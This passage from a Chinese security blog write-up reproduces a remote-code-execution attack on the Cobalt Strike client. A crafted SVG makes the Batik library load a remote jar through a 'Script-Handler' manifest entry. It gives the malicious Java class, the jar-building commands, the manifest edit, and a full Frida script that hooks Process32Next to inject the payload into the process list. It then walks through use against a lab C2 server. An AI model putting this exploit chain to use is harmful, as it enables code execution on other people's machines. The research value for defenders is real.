                        //获取Script-Handler键的名称，也就是类名
                        mediaType = man.getMainAttributes().getValue("Script-Handler");
                        if (mediaType != null) {
                            //加载类并获取空餐构造器，并且实例化
                            ScriptHandler h = (ScriptHandler)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();
                            h.run(this.document, this.getWindow());
                        }
                        mediaType = man.getMainAttributes().getValue("SVG-Handler-Class");
                        if (mediaType != null) {
                            EventListenerInitializer initializer = (EventListenerInitializer)cll.loadClass(mediaType).getDeclaredConstructor().newInstance();
                            this.getWindow();
                            initializer.initializeEventListeners((SVGDocument)this.document);
                        }
                    } catch (Exception var16) {
                        if (this.userAgent != null) {
                            this.userAgent.displayError(var16);
                        }
                    }
                }
ok，那么既然如此，整个链就很明显了，利用的方式也出来了
* * *
## 4\. 准备恶意svg和jar文件
    import java.io.IOException;
    public class Exp {
        public Exp() throws IOException {
            String os = System.getProperty("os.name").toLowerCase();
            if(os.indexOf("mac")>=0){
                Runtime.getRuntime().exec("open -na Calculator");
            }else if(os.indexOf("windows")>=0){
                Runtime.getRuntime().exec("calc.exe");
            }
        }
    }
然后将其打成jar包
    javac .\Exp.java
    jar -cvf exp.jar .\Exp.class
这时将生成的jar包通过压缩文件方式打开，然后去看`META-INF`目录下的`MANIFEST.MF`文件
由于之前我们对链路的研究所以知道这里缺少一个利用必不可少的值`Script-Handler`，我们这里可以手动添加，然后覆盖原本的`MANIFEST.MF`文件
这里其实还有一种方法就是再生成jar包的时候直接上MANIFEST.MF文件就带这条文本，前提需要类去实现`ScriptHandler`接口，由于还得导jar包我就懒得找了，感兴趣的自己尝试吧
**svg文件**
* * *
## 5\. 本地利用
当我准备好文件并打算在本地利用之前的demo—`SVGApplication`类准备本地利用的时候又出问题了，报了个错，提示我们这个jar包的url地址和与文档本身来自不同位置，那这又什么情况，还好这里能显示报错的详情，看第二行出现了一个熟悉的函数`checkCompatibleScriptURL`
这个函数之前都没有搭理它，现在就出来刷存在感了，看一下
传递两个参数一个是，类型，一个是jar包的url，继续跟进，这里调用了`checkLoadScript`函数，并且再原有的两个参数上还加上了个了一个`this.docPURL`，先别着急继续往下跟进函数，这里已经出来了两个URL，所以盲猜应该是对比两个地址的domain是否相同，所以查查这个docPURL是什么
通过搜索框查看赋值情况，发现这个`this.docPURL`应该是svg文件的url地址
所以这里将代码稍加改动，不读取本地svg文件，而是远程读取
ok，继续我们往上，我们回到实际的swing中利用
payload
成功
* * *
## 6\. 实战利用
同样的先抓包，获取publickey（详细的在我xss复现那篇已经详解，这里简单代过了）
获得地址
访问获得文件
获得publickey
    MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCKCnNWl64nFkgSz/CstkQXvrq/6bxXcI55UIsPyzIkoTG/zwF6yxfFTOiufyP4Ji0Dc9dI+K+yZhbr5Ou0h8fSjlOaaD+fEq24JN/BNXGwVTBATmwuxoGRezMxr7XvN2O/mtItwT8uFSv5RsITh1JVC3Qdyt+wO/Ng2L80NepiWQIDAQAB==
获取key后，用我修改后的脚本上线
利用
    http://192.168.52.129:5200/dpixel
然后将username改成payload，公钥也放好
执行
造成这个原因也很简单，就是payload长度限制，这个在大佬的文章中也提到了，我就不重复哔哔了，详情去看（不到为什么在xss那里我改了下脚本就可以利用了，可能当时的思路就是错的，然后瞎猫碰到死耗子了）
然后呢解决方法就是，退而求其次，从追求首页RCE转变成`进程列表`RCE，其实也还可以毕竟一个攻击者拿到一个主机通常还是会查看一下进程的，这里直接把大佬
漂亮鼠的代码拿来了，需要改一下payload和进程名（我相信这块是有办法绕过的，因为漂亮鼠大佬提供了Frame思路，但是只能高版本，还有一种是从aes通信入手，而且北辰大佬听说是直接首页RCE的，我非常想继续给它研究出来，奈何最近没什么时间，等之后有机会再说吧）
    import frida
    import time
    import argparse
    def spoof_user_name(target, url):
        # spawn target process
        print('[+] Spawning target process...')
        pid = frida.spawn(target)
        session = frida.attach(pid)
        # 下面的payload修改一下
        js = '''
        var payload=""
        payload=Array.from(payload).map(letter => letter.charCodeAt(0))
        var Process32Next=Module.findExportByName("kernel32.dll", 'Process32Next')
        Interceptor.attach(Process32Next, {
            onEnter: function(args) {
                //var hProcessSnap=args[0]
                var info=args[1];
                this.info = info;
                //console.log(this.info);
                this.szExeFile=this.info.add(0x24);
               // console.log(this.szExeFile);
            },
            onLeave: function(retval) {
            if(Memory.readAnsiString(this.szExeFile) == 'artifact.exe')//当进程名称为artifact时修改其名称，根据实际情况替换成其他
            {
                Memory.writeByteArray(ptr(this.szExeFile), payload)
                console.log("find artifact.exe write payload")
            }
            //console.log(Memory.readAnsiString(this.szExeFile));
            }
        });
        ''' 
        script = session.create_script(js)
        script.load()
        # resume
        frida.resume(pid)
        print('[+] Let\'s wait for 10 seconds to ensure the payload sent!')
        # wait for 10 seconds
        time.sleep(1000)
        # kill
        frida.kill(pid)
        print('[+] Done! Killed trojan process.')
        exit(0)
    def showbanner():
        # Thanks http://patorjk.com/ for creating this awesome banner
        banner = ''' $$$$$$\            $$\                 $$\   $$\     $$$$$$$$\ $$\                     
    $$  __$$\           $$ |                $$ |  $$ |    $$  _____|\__|                    
    $$ /  \__| $$$$$$\  $$$$$$$\   $$$$$$\  $$ |$$$$$$\   $$ |      $$\  $$$$$$\   $$$$$$\  
    $$ |      $$  __$$\ $$  __$$\  \____$$\ $$ |\_$$  _|  $$$$$\    $$ |$$  __$$\ $$  __$$\ 
    $$ |      $$ /  $$ |$$ |  $$ | $$$$$$$ |$$ |  $$ |    $$  __|   $$ |$$ |  \__|$$$$$$$$ |
    $$ |  $$\ $$ |  $$ |$$ |  $$ |$$  __$$ |$$ |  $$ |$$\ $$ |      $$ |$$ |      $$   ____|
    \$$$$$$  |\$$$$$$  |$$$$$$$  |\$$$$$$$ |$$ |  \$$$$  |$$ |      $$ |$$ |      \$$$$$$$\ 
     \______/  \______/ \_______/  \_______|\__|   \____/ \__|      \__|\__|       \_______|
                                                            CVE-2022-39197 PoC by @TomAPU
                                                            '''
        print(banner)
    parser = argparse.ArgumentParser(description='''This is a PoC for CVE-2022-39197, allowing to disclose CobaltStrike users' IP addresses by an exploit of XSS.(Well, clearly I haven't figure out how to trigger an RCE).
    WARNING: This tool works by executing the trojan generated by CobaltStrike and hooking GetUserNameA to add XSS payload to beat the server. So, please, execute it in a virtual machine!
    Currently, this POC only supports X86 exe payloads, and of course, works on Windows.
    ''')
    parser.add_argument('-t', '--target', help='target trojan sample', required=False)
    parser.add_argument('-u', '--url',
                        help='URL for server to load as img, considering the limit of length, it should be less than 20 bytes',
                        required=False)
    if __name__ == '__main__':
        showbanner()
        args = parser.parse_args()
        if args.target and args.url:
            if len(args.url) > 20:
                print('[-] URL should be shorter than 20 bytes :(')
                exit(-1)
            spoof_user_name(args.target, args.url)
        else:
            parser.print_help()
然后执行利用（我去 _**_ 的），不慌，仔细看一下发现原因，原来是我在本机用的java11编译的，而我这个C2的主机是java8的
so，本地再用java8重新编译并打jar包，然后再来（这块我又弄了1个小时左右，最后一直版本的报错，最后搞明白了，不知道哪出存在坑爹的缓存，其中我把http服务重开也还是那样，最后把jar包改名，然后把svg的连接中的jar包名也改成新的才成功，真的烦这种浪费时间的bug）
* * *
## 附录
### 1\. getElementsByTagNameNS详解
> getElementsByTagNameNS来获取指定命名空间并且为指定名称的元素
这里不光是讲解`getElementsByTagNameNS`函数，也来体会一下在java中对xml文档（svg本质也是xml文档）操作的具体实例，首先我们这里还是拿JS.svg举例
**JS.svg**
然后我们通过以下代码来获取一下`节点`（java操作xml需要导入xml-apis的jar包），注意这里我们先用`getElementsByTagName`函数，跟`getElementsByTagNameNS`函数类似，`getElementsByTagName`用来获取指定名称的的元素（它不考虑命名空间）
    // 创建解析器工厂
    DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
    DocumentBuilder db = factory.newDocumentBuilder();
    // 创建一个Document对象 设置XML位置
    Document doc = db.parse("src/test.svg");
    //获取xml中script节点
    NodeList modelList = doc.getElementsByTagName("script");
    //输出节点长度
    System.out.println(modelList.getLength());
    //输出节点索引为0的节点对象
    System.out.println(modelList.item(0));
    //输出节点索引为0的节点对象的文本内容
    System.out.println(modelList.item(0).getTextContent());
结果如下所示
上方的代码通过getElementsByTagName函数来获取指定名称的节点对象列表，那下面来正式介绍`getElementsByTagNameNS`，它的作用我们之前说过，获取指定命名空间并且为指定名称的元素，那么什么是命名空间呢？如下图所示，我这里起了两个名称，一个是默认命名空间，一个是别名命名空间
**默认命名空间**
默认命名空间很简单，如下图我的`svg`父节点的默认命名空间为一个值，那么它所有子节点都默认带上了它父节点的默认命名空间
如下代码所示，我们会发现这里获取到的节点列表的长度为0，也就是说这个节点列表里面的元素一个都没有，这个时候取出元素必然是空啊，那这是怎么回事？其实上方的说法并没有错误，要点就在我注释的这个代码里`factory.setNamespaceAware(true);`，java中该函数的默认情况下是false，在我们读取xml的时候会自动忽略掉命名空间，所以我们要将其改为true
如下图当修改后，成功返回了相应的节点
**别名命名空间：**
别名命名空间和默认命名空间不通，正常的子节点不会带上别名命名空间，必须要用别名去声明子节点才会生效，如下图所示，一目了然
            alert(1);
成功获取到节点
* * *
### 2\. URL详解
首先在之前我说`DocumentJarClassLoader`其实就是URLClassLoader的封装，而它的第一个参数才是远程jar包的url地址
为什么这么说呢，我们点进DocumentJarClassLoader类就一目了然，图中可以看到它继承`URLClassLoader`，而URLClassLoader的构造器的参数为，URL类型的数组，所以这里在代码第一行将`jarURL`封装成一个URL类型数组，并且用`super`函数，调用父类构造器，而它的第二个参数`documentURL`则被用来设置documentCodeSource的值，所以这里的jar包地址取决于第一个参数，往前推这个参数也就是`new
URL(purl.toString())`
ok，接下来我们来看`purl`对象，它在实例化的时候同样传了两个参数，那么`purl.toString()`的值到底取决于哪个参数呢？
我们实验一下即可，很明显它取决于第二个参数，所以往回推，上图中的`href`决定了远程jar包的地址，而href又是来自于svg文件中的`xlink:href`属性